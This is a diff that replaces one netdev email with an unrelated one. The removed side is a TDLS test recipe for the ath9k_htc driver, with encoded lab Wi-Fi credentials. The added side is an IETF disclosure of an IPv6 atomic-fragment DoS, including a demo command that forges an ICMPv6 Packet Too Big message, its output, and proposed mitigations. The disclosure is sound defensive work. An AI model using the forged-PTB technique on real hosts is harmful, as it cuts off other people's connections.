@@ -1,164 +1,159 @@
-From: Csaba Kiraly <csaba.kiraly@gmail.com>
-Subject: Re: [PATCH] ath9k_htc: advertise support for TDLS
-Date: Tue, 19 Aug 2014 21:00:59 +0200
-Message-ID: <53F39EEB.9060107@gmail.com>
-References: <1408319614-16041-1-git-send-email-csaba.kiraly@gmail.com> <53F309F5.4020101@gmx.net> <53F30A8B.6000202@rempel-privat.de>
+From: Fernando Gont <fernando@gont.com.ar>
+Subject: Deprecating the *generation* of IPv6 atomic fragments (Fwd: DoS attacks
+ (ICMPv6-based) resulting from IPv6 EH drops)
+Date: Tue, 19 Aug 2014 15:58:24 -0300
+Message-ID: <53F39E50.1020209@gont.com.ar>
+References: <53F33C4F.2070807@si6networks.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="------------040700010504050201050400"
-Cc: linux-wireless@vger.kernel.org, ath9k-devel@lists.ath9k.org,
-	netdev@vger.kernel.org
-To: Oleksij Rempel <linux@rempel-privat.de>, linville@tuxdriver.com
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+To: netdev <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-wg0-f49.google.com ([74.125.82.49]:59500 "EHLO
-	mail-wg0-f49.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752307AbaHSTBI (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Tue, 19 Aug 2014 15:01:08 -0400
-In-Reply-To: <53F30A8B.6000202@rempel-privat.de>
+Received: from web01.jbserver.net ([37.72.100.182]:46911 "EHLO
+	web01.jbserver.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752307AbaHSTRS (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Tue, 19 Aug 2014 15:17:18 -0400
+In-Reply-To: <53F33C4F.2070807@si6networks.com>
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-This is a multi-part message in MIME format.
---------------040700010504050201050400
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Folks,
 
-On 19/08/2014 10:27, Oleksij Rempel wrote:
-> Oppss... wrong email address.
->
-> Am 19.08.2014 um 10:25 schrieb Oleksij Rempel:
->> Am 18.08.2014 um 01:53 schrieb Csaba Kiraly:
->>> Based on a quick test with AR9271, TDLS seems to be working fine.
->>>
->>> Tests were done with 2 Atheros AR9271 based devices with firmware
->>> 1.3 (sha1 8d49f928aa40ac53c729189bff1333cd373a7fb5), associated
->>> with a WAP54G access point.
->>
->> please, don't use firmware 1.3. Use git source, or you can get
->> precompiled version here:
->> https://github.com/olerem/ath9k-htc-firmware-blob
+(Heads up):
+<http://www.ietf.org/id/draft-gont-6man-deprecate-atomfrag-generation-00.txt>
+     -- (Rationale below)
 
-I have just tried it with the latest firmware from git 
-(dc465e811c0272df7ec93b67de393129ff614173). Works fine.
+Other than the IPv6 stack update, being able to filter packets based on
+the "Next-Hop MTU" field of ICMPv6 Packet Too Big messages could be a
+nice thing to have.
 
->>
->>> TDLS worked fine both in WPA2 mode and
->>> without encryption. Stations maintained ping flood traffic between
->>> each other and towards the AP without significant losses.
->>>
->>> Not tested with AR7010.
->>
->> Seems ok for me. How can i reproduce testing environment?
+Thanks!
 
-Here it comes. I try to give a detailed description, although I suppose
-you don't need most of it :)
-I have used two laptops, two TP-Link TL-WN722N USB devices, and a
-Linksys WAP54g AP.
-
-# 0) stop conflicting services, clean up files
-service network-manager stop
-killall wpa_supplicant
-killall dhclient
-rm -rf /run/wpa_supplicant
-
-# 1) on both nodes, start wpa_supplicant and connect to the same AP.
-# Conf files attached
-hostap/wpa_supplicant/wpa_supplicant -D nl80211 -i wlan2 -c wpa_supplicant_wap54g_WPA2.conf
-
-# 2) on each node, configure IP addresses (or start dhclient)
-ifconfig wlan2 $IP1
-ifconfig wlan2 $IP2
-
-# 3) start pinging the other node
-ping $IP2
-
-# 4) start pinging the AP
-ping $IPAP
-
-# 5) get MAC of node2's Atheros card
-# get it on node2, or directly on node1 from the arp cache
-arp -n
-
-# 6) on node1, start wpa_cli
-hostap/wpa_supplicant/wpa_cli -i wlan2
-
-# 7) on node1, in wpa_cli, start the TDLS setup
-tdls_setup <MAC2>
-
-# 8) verify that TDLS works
-# - ping time will reduce (in my case it went from 1.6 ms to 1 ms)
-# - ping time to the AP should remain the same
-# - node2's MAC will appear in ath9k_htc debugfs
-ls /sys/kernel/debug/ieee80211/phy1/netdev:wlan2/stations
-# - look inside the debugfs folder for more details
-
-# 9) stress test
-ping -f $IP2
-
-# 10) disable encryption in the AP and repeat the same with the "open" config file
-
-# pitfalls and notes
-- APs could interfere in various ways with the test. Some models could
-set the TDLS prohibit flag. Others (like my Huawei E587) could
-work at the beginning but deauthenticate the nodes after 20-30 seconds.
-- I didn't check 802.11n
-- I have used the stock 3.16.0 kernel as the base, since 
-wireless-testing with tag master-2014-08-11 gave kernel panic
-during wlan scan, even without my patch (but this is for another mail)
-- use wpa_passphrase to generate the wpa_supplicant WPA2 config file
-
-Csaba
-
->>
->>> TDLS was enabled in earlier patches the same way for other
->>> Atheros drivers:
->>> ath9k (fd6562344dea2b8b2a5d644cf971f4e56004500a),
->>> and carl9170 (d1f3de71a584a82ee4e84505fce9acccf40215ff).
->>>
->>> Signed-off-by: Csaba Kiraly <csaba.kiraly@gmail.com>
->>> ---
->>>   drivers/net/wireless/ath/ath9k/htc_drv_init.c | 2 ++
->>>   1 file changed, 2 insertions(+)
->>>
->>> diff --git a/drivers/net/wireless/ath/ath9k/htc_drv_init.c b/drivers/net/wireless/ath/ath9k/htc_drv_init.c
->>> index 8a3bd5f..d779f4f 100644
->>> --- a/drivers/net/wireless/ath/ath9k/htc_drv_init.c
->>> +++ b/drivers/net/wireless/ath/ath9k/htc_drv_init.c
->>> @@ -592,6 +592,8 @@ static void ath9k_set_hw_capab(struct ath9k_htc_priv *priv,
->>>   	hw->wiphy->flags |= WIPHY_FLAG_IBSS_RSN |
->>>   			    WIPHY_FLAG_HAS_REMAIN_ON_CHANNEL;
->>>
->>> +	hw->wiphy->flags |= WIPHY_FLAG_SUPPORTS_TDLS;
->>> +
->>>   	hw->queues = 4;
->>>   	hw->max_listen_interval = 1;
->>>
->>>
->>
->>
->
->
+Cheers,
+Fernando
 
 
---------------040700010504050201050400
-Content-Type: text/plain; charset=UTF-8;
- name="wpa_supplicant_wap54g_open.conf"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
- filename="wpa_supplicant_wap54g_open.conf"
 
-Y3RybF9pbnRlcmZhY2U9L3J1bi93cGFfc3VwcGxpY2FudAojIHJlYWRpbmcgcGFzc3BocmFz
-ZSBmcm9tIHN0ZGluCm5ldHdvcms9ewoJc3NpZD0id2FwNTRnIgoJa2V5X21nbXQ9Tk9ORQp9
-Cg==
---------------040700010504050201050400
-Content-Type: text/plain; charset=UTF-8;
- name="wpa_supplicant_wap54g_WPA2.conf"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
- filename="wpa_supplicant_wap54g_WPA2.conf"
 
-Y3RybF9pbnRlcmZhY2U9L3J1bi93cGFfc3VwcGxpY2FudAojIHJlYWRpbmcgcGFzc3BocmFz
-ZSBmcm9tIHN0ZGluCm5ldHdvcms9ewoJc3NpZD0id2FwNTRnIgoJI3Bzaz0iYXRoZXJvczky
-NzEiCglwc2s9ZDViNjZlNWQyOTVhZmI1ODkyZjJhOGFkNzlkOGE4MmIzNWY0NTU0ZjhjYzkx
-N2IwNjA4NWY4YjdmZmI1ZGQxMwp9Cg==
---------------040700010504050201050400--
+-------- Forwarded Message --------
+Subject: DoS attacks (ICMPv6-based) resulting from IPv6 EH drops
+Date: Tue, 19 Aug 2014 09:00:15 -0300
+From: Fernando Gont <fgont@si6networks.com>
+To: IPv6 Operations <v6ops@ietf.org>
+CC: 'opsec@ietf.org' <opsec@ietf.org>
+
+Folks,
+
+Ten days ago or so we published this I-D:
+<http://www.ietf.org/internet-drafts/draft-gont-v6ops-ipv6-ehs-in-real-world-00.txt>
+
+Section 5.2 of the I-D discusses a possible attack vector based on a
+combination of "forged" ICMPv6 PTB messages and IPv6 frag drops by
+operators, along with proposed countermeasures -- on which we'd like to
+hear your comments.
+
+Since Section 5.2 is in the draft, let me offer a more informal and
+practical explanation:
+
+1) It is known that filtering of packets containing IPv6 Extension
+Headers (including the Fragment Header) is widespread (see our I-D above)
+
+2) Let us assume that Host A is communicating with Server B, and that
+some node filters fragments between Host A and Server B.
+
+3) An attacker sends a spoofed ICMPv6 PTB to server B, with a "Next Hop
+MTU<1280), in the hopes of eliciting "atomic fragments" (see
+<http://tools.ietf.org/rfc/rfc6946.txt>) from now on.
+
+4) Now server B starts sending IPv6 atomic fragments... And since they
+include a frag header (and in '2)' above we noted that frags are dropped
+on that path), these packets get dropped (i.e., DoS).
+
+
+"Demo" with the icmp6 tool
+(<http://www.si6networks.com/tools/ipv6toolkit>) -- (some addresses have
+been changed (anonimized), but it is trivial to pick a victim server...)
+
+"2001:db8:1:10:0:1991:8:25" is the server, and
+"2001:5c0:1000:a::e7d" is my own address):
+
+---- cut here ----
+***** First of all, I telnet to port 80 of the server, and
+everything works as expected ****
+
+fgont@satellite:~$ telnet 2001:db8:1:10:0:1991:8:25 80
+Trying 2001:db8:1:10:0:1991:8:25...
+Connected to 2001:db8:1:10:0:1991:8:25.
+Escape character is '^]'.
+^CConnection closed by foreign host.
+
+**** Now I send the forget ICMPv6 PTB ****
+
+fgont@satellite:~$ sudo icmp6  --icmp6-packet-too-big -d
+2001:db8:1:10:0:1991:8:25 --peer-addr 2001:5c0:1000:a::e7d --mtu 1000 -o
+80 -v
+icmp6: Security assessment tool for attack vectors based on ICMPv6 error
+messages
+
+IPv6 Source Address: 2001:5c0:1000:a::e7d (automatically selected)
+IPv6 Destination Address: 2001:db8:1:10:0:1991:8:25
+IPv6 Hop Limit: 227 (randomized)
+ICMPv6 Packet Too Big (Type 2), Code 0
+Next-Hop MTU: 1000
+Payload Type: IPv6/TCP (default)
+Source Address: 2001:db8:1:10:0:1991:8:25 (automatically-selected)
+Destination Address: 2001:5c0:1000:a::e7d
+Hop Limit: 237 (randomized)
+Source Port: 80	Destination Port: 38189 (randomized)
+SEQ Number: 734463213 (randomized)	ACK Number: 866605720 (randomized)
+Flags: A (default)	Window: 18944 (randomized)	URG Pointer: 0 (default)
+Initial attack packet(s) sent successfully.
+
+
+***** And now I try the same telnet command as above... but it fails,
+because the frags from the server to me are getting dropped somewhere ****
+
+fgont@satellite:~$ telnet 2001:db8:1:10:0:1991:8:25 80
+Trying 2001:db8:1:10:0:1991:8:25...
+[timeout]
+---- cut here ----
+
+
+Of course, in this particular case I just "shot myself". But one could
+do this to DoS connections between mailservers, etc.
+
+A nice question is: what if e.g....
+
+1) some BGP servers accept ICMPv6 PTB that claim an MTU < 1280, and
+react (as expected) by generating atomic fragments, *and*,
+
+2) These same BGP servers deem fragmentation as "harmful", and hence
+drop such fragments
+
+you could essentially DoS traffic between them
+
+As noted in the I-D, the mitigations seem to be:
+
+1) Artificially limit your packets to 1280, and drop all incoming ICMPv6
+PTB, or,
+
+2) Have your device just drop ICMPv6 PTB that claim a Next-Hop MTU
+smaller than 1280.
+
+Thoughts?
+-- 
+Fernando Gont
+SI6 Networks
+e-mail: fgont@si6networks.com
+PGP Fingerprint: 6666 31C6 D484 63B2 8FB1 E3C4 AE25 0D55 1D4E 7492
+
+
+
+
+
+
+
+-- 
+Fernando Gont
+e-mail: fernando@gont.com.ar || fgont@si6networks.com
+PGP Fingerprint: 7809 84F5 322E 45C7 F1C9 3945 96EE A9EF D076 FFF1
